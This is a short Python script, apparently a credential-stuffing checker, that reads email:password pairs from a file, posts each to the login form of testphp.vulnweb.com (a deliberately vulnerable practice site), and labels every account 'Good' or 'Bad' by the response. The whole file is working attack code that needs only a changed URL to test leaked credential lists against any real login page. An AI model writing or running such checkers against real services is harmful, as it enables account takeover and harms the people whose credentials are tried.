from email import header
import requests

mailslist = open("mails.txt", "r").readlines()

url = "http://testphp.vulnweb.com/login.php"

for mail in mailslist:
    seq = mail.strip()
    acc = seq.split(":")

    username = acc[0]
    password = acc[1]
    account = username + ":" + password

    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36",
        "uname": username,
        "pass": password
    }

    req = requests.post(url, data=header).text

    if not "username" in req:
        print("Good: " + account)
    else:
        print("Bad: " + account)